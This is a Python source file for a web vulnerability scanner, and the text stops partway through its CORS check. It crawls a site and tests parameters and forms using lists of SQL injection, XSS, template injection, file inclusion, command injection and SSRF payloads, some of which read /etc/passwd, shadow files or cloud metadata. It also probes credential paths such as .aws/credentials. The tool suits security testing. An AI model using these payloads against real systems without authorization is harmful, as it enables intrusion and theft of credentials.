"""Web vulnerability scanner — comprehensive HTTP security testing engine.

Tests for: SQLi, XSS, SSRF, SSTI, LFI/RFI, Open Redirect, CORS,
security headers, directory traversal, command injection, IDOR, CSRF,
information disclosure, and more.
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import random
import re
import string
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import httpx
import structlog

logger = structlog.get_logger()


class VulnType(str, Enum):
    SQLI = "sql_injection"
    XSS = "cross_site_scripting"
    SSRF = "server_side_request_forgery"
    SSTI = "server_side_template_injection"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    OPEN_REDIRECT = "open_redirect"
    CORS_MISCONFIGURATION = "cors_misconfiguration"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    COMMAND_INJECTION = "command_injection"
    IDOR = "insecure_direct_object_reference"
    INFORMATION_DISCLOSURE = "information_disclosure"
    MISSING_HEADERS = "missing_security_headers"
    HTTP_METHOD_TAMPERING = "http_method_tampering"
    CRLF_INJECTION = "crlf_injection"
    XXE = "xml_external_entity"
    CSRF = "cross_site_request_forgery"
    CLICKJACKING = "clickjacking"
    HOST_HEADER_INJECTION = "host_header_injection"
    SUBDOMAIN_TAKEOVER = "subdomain_takeover"
    BROKEN_AUTH = "broken_authentication"
    SESSION_FIXATION = "session_fixation"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    PROTOTYPE_POLLUTION = "prototype_pollution"
    GRAPHQL_INTROSPECTION = "graphql_introspection"
    WAF_DETECTED = "waf_detected"


class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class WebFinding:
    """A single web vulnerability finding."""
    vuln_type: VulnType
    severity: Severity
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    confidence: float = 0.0
    request_data: str = ""
    response_snippet: str = ""
    cwe_id: str = ""
    cvss_score: float = 0.0


@dataclass
class CrawledPage:
    """A discovered page from crawling."""
    url: str
    status_code: int
    content_type: str = ""
    title: str = ""
    forms: list[dict[str, Any]] = field(default_factory=list)
    links: list[str] = field(default_factory=list)
    params: list[str] = field(default_factory=list)
    headers: dict[str, str] = field(default_factory=dict)
    body_hash: str = ""
    response_size: int = 0


@dataclass
class WebScanConfig:
    """Configuration for web scanning."""
    max_depth: int = 3
    max_pages: int = 500
    timeout_s: float = 10.0
    max_concurrent: int = 20
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    custom_headers: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)
    auth_token: str = ""
    follow_redirects: bool = True
    test_sqli: bool = True
    test_xss: bool = True
    test_ssrf: bool = True
    test_ssti: bool = True
    test_lfi: bool = True
    test_cmdi: bool = True
    test_headers: bool = True
    test_cors: bool = True
    test_methods: bool = True
    rate_limit: int = 0
    scope_regex: str = ""
    exclude_regex: str = r"\.(jpg|jpeg|png|gif|svg|css|js|ico|woff|woff2|ttf|eot|pdf|zip|gz|tar)(\?.*)?$"


# ── SQL Injection Payloads ─────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "1' AND '1'='1",
    "1 OR 1=1", "1' OR '1'='1'--", "') OR ('1'='1",
    "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--", "\" AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--", "' OR '' = '", "1' ORDER BY 1--",
    "1' ORDER BY 10--", "1' ORDER BY 100--",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
]

SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql_", "warning: pg_", "warning: mssql_",
    "unclosed quotation mark", "microsoft ole db provider",
    "ora-01756", "ora-00933", "ora-00936", "ora-06512",
    "syntax error", "mysql_fetch", "mysql_num_rows",
    "psql:", "pg_query", "pg_exec",
    "sqlite3.operationalerror", "sqlite_error",
    "microsoft sql server", "sql server driver",
    "odbc sql server driver", "sqlstate",
    "quoted string not properly terminated",
    "unterminated string", "division by zero",
    "invalid column name", "column count doesn't match",
    "unknown column", "table or view does not exist",
    "conversion failed", "cast from string",
]

# ── XSS Payloads ───────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<input onfocus=alert("XSS") autofocus>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    "javascript:alert('XSS')",
    'data:text/html,<script>alert("XSS")</script>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d="M0,0"><animate attributeName="d" values="M0,0">',
    "{{constructor.constructor('return this')().alert('XSS')}}",
    "${alert('XSS')}",
    "'-alert(document.domain)-'",
    "<img/src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]

XSS_REFLECTION_SIGNATURES = [
    '<script>alert("XSS")</script>',
    'onerror=alert("XSS")',
    'onload=alert("XSS")',
    "alert('XSS')",
    "alert(document.domain)",
]

# ── SSTI Payloads ──────────────────────────────────────────

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("#{7*7}", "49"),
    ("${{7*7}}", "49"),
    ("{{config}}", "SECRET_KEY"),
    ("{{self.__class__}}", "__class__"),
    ("{{''.__class__.__mro__}}", "object"),
    ("{{request.application.__globals__}}", "os"),
    ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"),
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}", ""),
    ("{{_self.env.getFilter('id')}}", "uid="),
    ("{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()", "uid="),
]

# ── LFI Payloads ───────────────────────────────────────────

LFI_PAYLOADS = [
    ("../../../etc/passwd", "root:"),
    ("....//....//....//etc/passwd", "root:"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
    ("..%252F..%252F..%252Fetc%252Fpasswd", "root:"),
    ("/etc/passwd", "root:"),
    ("../../../etc/shadow", "root:"),
    ("../../../proc/self/environ", "PATH="),
    ("....//....//....//etc/hosts", "localhost"),
    ("../../../windows/system32/drivers/etc/hosts", "localhost"),
    ("../../../windows/win.ini", "[extensions]"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
    ("php://input", ""),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+", "uid="),
    ("expect://id", "uid="),
    ("/proc/self/cmdline", ""),
    ("/proc/version", "Linux version"),
    ("/proc/self/status", "Name:"),
]

# ── Command Injection Payloads ─────────────────────────────

CMDI_PAYLOADS = [
    ("; id", "uid="),
    ("| id", "uid="),
    ("|| id", "uid="),
    ("& id", "uid="),
    ("&& id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    ("; cat /etc/passwd", "root:"),
    ("| cat /etc/passwd", "root:"),
    ("\n id", "uid="),
    ("\r\n id", "uid="),
    ("; sleep 5", ""),
    ("| sleep 5", ""),
    ("& ping -c 5 127.0.0.1 &", ""),
    ("$(sleep 5)", ""),
    ("`sleep 5`", ""),
]

# ── SSRF Payloads ──────────────────────────────────────────

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "http://0177.0.0.1",
    "http://127.1",
    "http://127.0.1",
]

# ── Security Headers ───────────────────────────────────────

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": Severity.MEDIUM,
        "cwe": "CWE-319",
        "description": "Missing HSTS header allows HTTP downgrade attacks",
        "remediation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains",
    },
    "X-Content-Type-Options": {
        "severity": Severity.LOW,
        "cwe": "CWE-16",
        "description": "Missing X-Content-Type-Options allows MIME sniffing",
        "remediation": "Add X-Content-Type-Options: nosniff",
    },
    "X-Frame-Options": {
        "severity": Severity.MEDIUM,
        "cwe": "CWE-1021",
        "description": "Missing X-Frame-Options allows clickjacking",
        "remediation": "Add X-Frame-Options: DENY or SAMEORIGIN",
    },
    "Content-Security-Policy": {
        "severity": Severity.MEDIUM,
        "cwe": "CWE-16",
        "description": "Missing Content-Security-Policy allows XSS and data injection",
        "remediation": "Implement a restrictive CSP policy",
    },
    "X-XSS-Protection": {
        "severity": Severity.LOW,
        "cwe": "CWE-79",
        "description": "Missing X-XSS-Protection (legacy but still useful for older browsers)",
        "remediation": "Add X-XSS-Protection: 1; mode=block",
    },
    "Referrer-Policy": {
        "severity": Severity.LOW,
        "cwe": "CWE-200",
        "description": "Missing Referrer-Policy can leak sensitive URL information",
        "remediation": "Add Referrer-Policy: strict-origin-when-cross-origin",
    },
    "Permissions-Policy": {
        "severity": Severity.LOW,
        "cwe": "CWE-16",
        "description": "Missing Permissions-Policy allows unrestricted feature access",
        "remediation": "Add Permissions-Policy with restrictive feature policy",
    },
}

# ── Sensitive Files / Paths ────────────────────────────────

SENSITIVE_PATHS = [
    "/.git/config", "/.git/HEAD", "/.svn/entries", "/.env",
    "/wp-config.php.bak", "/web.config", "/config.php",
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/.htpasswd",
    "/server-status", "/server-info", "/.DS_Store",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/phpinfo.php", "/info.php", "/test.php",
    "/backup.zip", "/backup.tar.gz", "/backup.sql",
    "/database.sql", "/dump.sql", "/db.sql",
    "/admin", "/admin/", "/administrator/", "/wp-admin/",
    "/phpmyadmin/", "/pma/", "/adminer.php",
    "/.well-known/security.txt", "/security.txt",
    "/api/v1/", "/api/v2/", "/graphql",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/actuator", "/actuator/health", "/actuator/env",
    "/trace", "/debug", "/console",
    "/elmah.axd", "/error_log", "/debug.log",
    "/.aws/credentials", "/.docker/config.json",
    "/wp-json/wp/v2/users", "/xmlrpc.php",
    "/.well-known/openid-configuration",
]


class WebVulnScanner:
    """Comprehensive web application vulnerability scanner.

    Performs:
    1. Crawling — discover pages, forms, parameters
    2. Active testing — inject payloads for each vulnerability type
    3. Passive analysis — check headers, cookies, TLS, information disclosure
    4. Report generation — structured findings with evidence
    """

    def __init__(self, config: WebScanConfig | None = None):
        self.config = config or WebScanConfig()
        self._findings: list[WebFinding] = []
        self._crawled: dict[str, CrawledPage] = {}
        self._visited_urls: set[str] = set()
        self._client: httpx.AsyncClient | None = None
        self._base_url = ""
        self._base_domain = ""

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None or self._client.is_closed:
            headers = {
                "User-Agent": self.config.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                **self.config.custom_headers,
            }
            if self.config.auth_token:
                headers["Authorization"] = f"Bearer {self.config.auth_token}"

            self._client = httpx.AsyncClient(
                headers=headers,
                cookies=self.config.cookies,
                timeout=httpx.Timeout(self.config.timeout_s),
                follow_redirects=self.config.follow_redirects,
                verify=False,
            )
        return self._client

    async def scan(self, target_url: str) -> list[WebFinding]:
        """Run a full web vulnerability scan."""
        self._base_url = target_url.rstrip("/")
        parsed = urllib.parse.urlparse(self._base_url)
        self._base_domain = parsed.netloc
        self._findings = []
        self._crawled = {}
        self._visited_urls = set()

        logger.info("web_scan_starting", target=target_url)
        start = time.monotonic()

        # Phase 1: Crawl
        await self._crawl(self._base_url, depth=0)
        logger.info("crawl_complete", pages=len(self._crawled))

        # Phase 2: Passive checks
        await self._check_security_headers(self._base_url)
        await self._check_sensitive_files(self._base_url)
        await self._check_cors(self._base_url)
        await self._check_http_methods(self._base_url)

        # Phase 3: Active testing on discovered pages
        sem = asyncio.Semaphore(self.config.max_concurrent)
        tasks = []
        for page in self._crawled.values():
            tasks.append(self._test_page(page, sem))

        await asyncio.gather(*tasks, return_exceptions=True)

        elapsed = time.monotonic() - start
        logger.info(
            "web_scan_complete",
            target=target_url,
            pages_crawled=len(self._crawled),
            findings=len(self._findings),
            elapsed_s=round(elapsed, 2),
        )

        return self._findings

    async def _crawl(self, url: str, depth: int) -> None:
        """Recursively crawl the target website."""
        if depth > self.config.max_depth:
            return
        if len(self._crawled) >= self.config.max_pages:
            return

        normalized = self._normalize_url(url)
        if normalized in self._visited_urls:
            return
        self._visited_urls.add(normalized)

        # Check scope
        if not self._in_scope(url):
            return

        # Check exclusions
        if self.config.exclude_regex:
            if re.search(self.config.exclude_regex, url, re.IGNORECASE):
                return

        try:
            client = await self._get_client()
            resp = await client.get(url)

            content_type = resp.headers.get("content-type", "")
            if "text/html" not in content_type and "application/json" not in content_type:
                return

            body = resp.text
            page = CrawledPage(
                url=url,
                status_code=resp.status_code,
                content_type=content_type,
                title=self._extract_title(body),
                forms=self._extract_forms(body, url),
                links=self._extract_links(body, url),
                params=self._extract_params(url),
                headers=dict(resp.headers),
                body_hash=hashlib.md5(body.encode()).hexdigest(),
                response_size=len(body),
            )

            self._crawled[normalized] = page

            # Crawl discovered links
            for link in page.links:
                if len(self._crawled) < self.config.max_pages:
                    await self._crawl(link, depth + 1)

        except Exception as e:
            logger.debug("crawl_error", url=url, error=str(e))

    def _normalize_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def _in_scope(self, url: str) -> bool:
        parsed = urllib.parse.urlparse(url)
        if self.config.scope_regex:
            return bool(re.match(self.config.scope_regex, url))
        return parsed.netloc == self._base_domain

    def _extract_title(self, body: str) -> str:
        match = re.search(r"<title[^>]*>(.*?)</title>", body, re.IGNORECASE | re.DOTALL)
        return html.unescape(match.group(1).strip()) if match else ""

    def _extract_links(self, body: str, base_url: str) -> list[str]:
        links = set()
        for match in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']', body, re.IGNORECASE):
            link = match.group(1)
            absolute = urllib.parse.urljoin(base_url, link)
            if self._in_scope(absolute):
                links.add(absolute)
        return list(links)

    def _extract_forms(self, body: str, base_url: str) -> list[dict[str, Any]]:
        forms = []
        for form_match in re.finditer(r"<form[^>]*>(.*?)</form>", body, re.IGNORECASE | re.DOTALL):
            form_html = form_match.group(0)
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)

            action = urllib.parse.urljoin(base_url, action_match.group(1)) if action_match else base_url
            method = (method_match.group(1).upper() if method_match else "GET")

            inputs = []
            for inp in re.finditer(r'<input[^>]*>', form_html, re.IGNORECASE):
                inp_html = inp.group(0)
                name = re.search(r'name=["\']([^"\']*)["\']', inp_html, re.IGNORECASE)
                inp_type = re.search(r'type=["\']([^"\']*)["\']', inp_html, re.IGNORECASE)
                value = re.search(r'value=["\']([^"\']*)["\']', inp_html, re.IGNORECASE)
                if name:
                    inputs.append({
                        "name": name.group(1),
                        "type": inp_type.group(1) if inp_type else "text",
                        "value": value.group(1) if value else "",
                    })

            # Also find textarea and select elements
            for ta in re.finditer(r'<textarea[^>]*name=["\']([^"\']*)["\']', form_html, re.IGNORECASE):
                inputs.append({"name": ta.group(1), "type": "textarea", "value": ""})
            for sel in re.finditer(r'<select[^>]*name=["\']([^"\']*)["\']', form_html, re.IGNORECASE):
                inputs.append({"name": sel.group(1), "type": "select", "value": ""})

            forms.append({
                "action": action,
                "method": method,
                "inputs": inputs,
            })

        return forms

    def _extract_params(self, url: str) -> list[str]:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return list(params.keys())

    async def _test_page(self, page: CrawledPage, sem: asyncio.Semaphore) -> None:
        """Run all active tests on a crawled page."""
        async with sem:
            # Test URL parameters
            for param in page.params:
                if self.config.test_sqli:
                    await self._test_sqli_param(page.url, param)
                if self.config.test_xss:
                    await self._test_xss_param(page.url, param)
                if self.config.test_ssti:
                    await self._test_ssti_param(page.url, param)
                if self.config.test_lfi:
                    await self._test_lfi_param(page.url, param)
                if self.config.test_cmdi:
                    await self._test_cmdi_param(page.url, param)
                if self.config.test_ssrf:
                    await self._test_ssrf_param(page.url, param)

            # Test forms
            for form_info in page.forms:
                for inp in form_info.get("inputs", []):
                    name = inp.get("name", "")
                    if not name:
                        continue
                    if inp.get("type") in ("hidden", "submit", "button", "image"):
                        continue
                    if self.config.test_sqli:
                        await self._test_sqli_form(form_info, name)
                    if self.config.test_xss:
                        await self._test_xss_form(form_info, name)

    async def _test_sqli_param(self, url: str, param: str) -> None:
        """Test a URL parameter for SQL injection."""
        client = await self._get_client()
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        original_value = params.get(param, "1")

        for payload in SQLI_ERROR_PAYLOADS[:15]:
            try:
                test_params = {**params, param: original_value + payload}
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                resp = await client.get(test_url, params=test_params)
                body = resp.text.lower()

                for sig in SQLI_ERROR_SIGNATURES:
                    if sig in body:
                        self._findings.append(WebFinding(
                            vuln_type=VulnType.SQLI,
                            severity=Severity.CRITICAL,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=sig,
                            description=f"SQL injection detected in parameter '{param}' — database error message leaked",
                            remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                            confidence=0.9,
                            cwe_id="CWE-89",
                            cvss_score=9.8,
                        ))
                        return  # One finding per param is enough
            except Exception:
                continue

        # Time-based blind SQLi
        await self._test_time_based_sqli(url, param, params, client)

    async def _test_time_based_sqli(
        self, url: str, param: str, params: dict[str, str], client: httpx.AsyncClient
    ) -> None:
        """Test for time-based blind SQL injection."""
        parsed = urllib.parse.urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        original_value = params.get(param, "1")

        # Measure baseline
        try:
            start = time.monotonic()
            await client.get(test_url, params=params)
            baseline = time.monotonic() - start
        except Exception:
            return

        time_payloads = [
            f"{original_value}' AND SLEEP(5)--",
            f"{original_value}'; WAITFOR DELAY '0:0:5'--",
            f"{original_value}' AND pg_sleep(5)--",
        ]

        for payload in time_payloads:
            try:
                test_params = {**params, param: payload}
                start = time.monotonic()
                await client.get(test_url, params=test_params)
                elapsed = time.monotonic() - start

                if elapsed > baseline + 4.0:
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed - baseline:.1f}s (baseline: {baseline:.1f}s)",
                        description=f"Time-based blind SQL injection in parameter '{param}'",
                        remediation="Use parameterized queries / prepared statements.",
                        confidence=0.85,
                        cwe_id="CWE-89",
                        cvss_score=9.8,
                    ))
                    return
            except Exception:
                continue

    async def _test_xss_param(self, url: str, param: str) -> None:
        """Test a URL parameter for reflected XSS."""
        client = await self._get_client()
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # First test reflection with a unique canary
        canary = f"recursec{''.join(random.choices(string.ascii_lowercase, k=8))}"
        try:
            test_params = {**params, param: canary}
            resp = await client.get(test_url, params=test_params)
            if canary not in resp.text:
                return  # No reflection
        except Exception:
            return

        # Test XSS payloads
        for payload in XSS_PAYLOADS[:12]:
            try:
                test_params = {**params, param: payload}
                resp = await client.get(test_url, params=test_params)
                body = resp.text

                for sig in XSS_REFLECTION_SIGNATURES:
                    if sig in body:
                        self._findings.append(WebFinding(
                            vuln_type=VulnType.XSS,
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=sig,
                            description=f"Reflected XSS in parameter '{param}' — payload rendered unescaped",
                            remediation="Escape all user input before rendering. Use Content-Security-Policy header.",
                            confidence=0.9,
                            cwe_id="CWE-79",
                            cvss_score=6.1,
                        ))
                        return
            except Exception:
                continue

    async def _test_ssti_param(self, url: str, param: str) -> None:
        """Test for Server-Side Template Injection."""
        client = await self._get_client()
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, expected in SSTI_PAYLOADS[:6]:
            try:
                test_params = {**params, param: payload}
                resp = await client.get(test_url, params=test_params)
                if expected and expected in resp.text:
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.SSTI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Template expression evaluated: found '{expected}' in response",
                        description=f"Server-Side Template Injection in parameter '{param}' — can lead to RCE",
                        remediation="Never pass user input directly to template engines. Use sandboxed templates.",
                        confidence=0.9,
                        cwe_id="CWE-1336",
                        cvss_score=9.8,
                    ))
                    return
            except Exception:
                continue

    async def _test_lfi_param(self, url: str, param: str) -> None:
        """Test for Local File Inclusion."""
        client = await self._get_client()
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, expected in LFI_PAYLOADS[:8]:
            try:
                test_params = {**params, param: payload}
                resp = await client.get(test_url, params=test_params)
                if expected and expected in resp.text:
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.LFI,
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"File content leaked: found '{expected}' in response",
                        description=f"Local File Inclusion in parameter '{param}' — arbitrary file read possible",
                        remediation="Never use user input directly in file path operations. Use whitelisting.",
                        confidence=0.9,
                        cwe_id="CWE-98",
                        cvss_score=7.5,
                    ))
                    return
            except Exception:
                continue

    async def _test_cmdi_param(self, url: str, param: str) -> None:
        """Test for OS Command Injection."""
        client = await self._get_client()
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload, expected in CMDI_PAYLOADS[:6]:
            if not expected:
                continue
            try:
                test_params = {**params, param: params.get(param, "") + payload}
                resp = await client.get(test_url, params=test_params)
                if expected in resp.text:
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.COMMAND_INJECTION,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Command output leaked: found '{expected}' in response",
                        description=f"OS Command Injection in parameter '{param}' — full system access possible",
                        remediation="Never pass user input to system commands. Use safe APIs instead of shell execution.",
                        confidence=0.9,
                        cwe_id="CWE-78",
                        cvss_score=9.8,
                    ))
                    return
            except Exception:
                continue

    async def _test_ssrf_param(self, url: str, param: str) -> None:
        """Test for Server-Side Request Forgery."""
        client = await self._get_client()
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Get baseline response
        try:
            resp = await client.get(test_url, params=params)
            _ = len(resp.text)
        except Exception:
            return

        for payload in SSRF_PAYLOADS[:8]:
            try:
                test_params = {**params, param: payload}
                resp = await client.get(test_url, params=test_params)
                body = resp.text

                # Check for cloud metadata
                if any(sig in body for sig in ["ami-id", "instance-id", "iam/info", "computeMetadata"]):
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.SSRF,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Cloud metadata endpoint accessible",
                        description=f"SSRF in parameter '{param}' — cloud metadata accessible, potential credential theft",
                        remediation="Validate and whitelist URLs. Block requests to internal IPs and metadata endpoints.",
                        confidence=0.95,
                        cwe_id="CWE-918",
                        cvss_score=9.1,
                    ))
                    return

                # Check for internal service responses
                if "root:" in body and "/bin/" in body:
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.SSRF,
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Internal file content returned",
                        description=f"SSRF in parameter '{param}' — can read internal files",
                        remediation="Validate and whitelist URLs. Block file:// protocol.",
                        confidence=0.9,
                        cwe_id="CWE-918",
                        cvss_score=7.5,
                    ))
                    return
            except Exception:
                continue

    async def _test_sqli_form(self, form_info: dict[str, Any], target_field: str) -> None:
        """Test a form field for SQL injection."""
        client = await self._get_client()
        action = form_info["action"]
        method = form_info["method"]

        for payload in SQLI_ERROR_PAYLOADS[:10]:
            try:
                data = {}
                for inp in form_info["inputs"]:
                    name = inp["name"]
                    if name == target_field:
                        data[name] = payload
                    else:
                        data[name] = inp.get("value", "test")

                if method == "POST":
                    resp = await client.post(action, data=data)
                else:
                    resp = await client.get(action, params=data)

                body = resp.text.lower()
                for sig in SQLI_ERROR_SIGNATURES:
                    if sig in body:
                        self._findings.append(WebFinding(
                            vuln_type=VulnType.SQLI,
                            severity=Severity.CRITICAL,
                            url=action,
                            parameter=target_field,
                            payload=payload,
                            evidence=sig,
                            description=f"SQL injection in form field '{target_field}' at {action}",
                            remediation="Use parameterized queries / prepared statements.",
                            confidence=0.9,
                            cwe_id="CWE-89",
                            cvss_score=9.8,
                        ))
                        return
            except Exception:
                continue

    async def _test_xss_form(self, form_info: dict[str, Any], target_field: str) -> None:
        """Test a form field for XSS."""
        client = await self._get_client()
        action = form_info["action"]
        method = form_info["method"]

        for payload in XSS_PAYLOADS[:8]:
            try:
                data = {}
                for inp in form_info["inputs"]:
                    name = inp["name"]
                    if name == target_field:
                        data[name] = payload
                    else:
                        data[name] = inp.get("value", "test")

                if method == "POST":
                    resp = await client.post(action, data=data)
                else:
                    resp = await client.get(action, params=data)

                for sig in XSS_REFLECTION_SIGNATURES:
                    if sig in resp.text:
                        self._findings.append(WebFinding(
                            vuln_type=VulnType.XSS,
                            severity=Severity.HIGH,
                            url=action,
                            parameter=target_field,
                            payload=payload,
                            evidence=sig,
                            description=f"XSS in form field '{target_field}' at {action}",
                            remediation="Escape all user input before rendering.",
                            confidence=0.85,
                            cwe_id="CWE-79",
                            cvss_score=6.1,
                        ))
                        return
            except Exception:
                continue

    async def _check_security_headers(self, url: str) -> None:
        """Check for missing security headers."""
        if not self.config.test_headers:
            return
        try:
            client = await self._get_client()
            resp = await client.get(url)
            headers = resp.headers

            for header_name, info in SECURITY_HEADERS.items():
                if header_name.lower() not in {k.lower() for k in headers.keys()}:
                    self._findings.append(WebFinding(
                        vuln_type=VulnType.MISSING_HEADERS,
                        severity=info["severity"],
                        url=url,
                        description=info["description"],
                        remediation=info["remediation"],
                        confidence=1.0,
                        cwe_id=info["cwe"],
                    ))

            # Check for information disclosure headers
            server_header = headers.get("server", "")
            if server_header:
                self._findings.append(WebFinding(
                    vuln_type=VulnType.INFORMATION_DISCLOSURE,
                    severity=Severity.LOW,
                    url=url,
                    evidence=f"Server: {server_header}",
                    description=f"Server version disclosed: {server_header}",
                    remediation="Remove or obfuscate the Server header.",
                    confidence=1.0,
                    cwe_id="CWE-200",
                ))

            x_powered = headers.get("x-powered-by", "")
            if x_powered:
                self._findings.append(WebFinding(
                    vuln_type=VulnType.INFORMATION_DISCLOSURE,
                    severity=Severity.LOW,
                    url=url,
                    evidence=f"X-Powered-By: {x_powered}",
                    description=f"Technology stack disclosed: {x_powered}",
                    remediation="Remove the X-Powered-By header.",
                    confidence=1.0,
                    cwe_id="CWE-200",
                ))

        except Exception as e:
            logger.debug("header_check_error", url=url, error=str(e))

    async def _check_cors(self, url: str) -> None:
        """Check for CORS misconfiguration."""
        if not self.config.test_cors:
            return
        try:
            client = await self._get_client()
            # Test with arbitrary origin
            resp = await client.get(url, headers={"Origin": "https://evil.com"})
            acao = resp.headers.get("access-control-allow-origin", "")

            if acao == "*":
                self._findings.append(WebFinding(
                    vuln_type=VulnType.CORS_MISCONFIGURATION,
                    severity=Severity.MEDIUM,
                    url=url,
                    evidence="Access-Control-Allow-Origin: *",
                    description="CORS allows any origin — credentials may be exfiltrated",
                    remediation="Restrict CORS to specific trusted origins.",
                    confidence=1.0,
                    cwe_id="CWE-942",
                    cvss_score=5.3,
                ))
            elif acao == "https://evil.com":
                acac = resp.headers.get("access-control-allow-credentials", "")
                severity = Severity.HIGH if acac.lower() == "true" else Severity.MEDIUM
                self._findings.append(WebFinding(
                    vuln_type=VulnType.CORS_MISCONFIGURATION,
                    severity=severity,
                    url=url,
                    evidence=f"ACAO: {acao}, ACAC: {acac}",
                    description="CORS reflects arbitrary origin" + (" with credentials" if acac else ""),
                    remediation="Validate Origin header against a whitelist.",
                    confidence=0.95,
                    cwe_id="CWE-942",
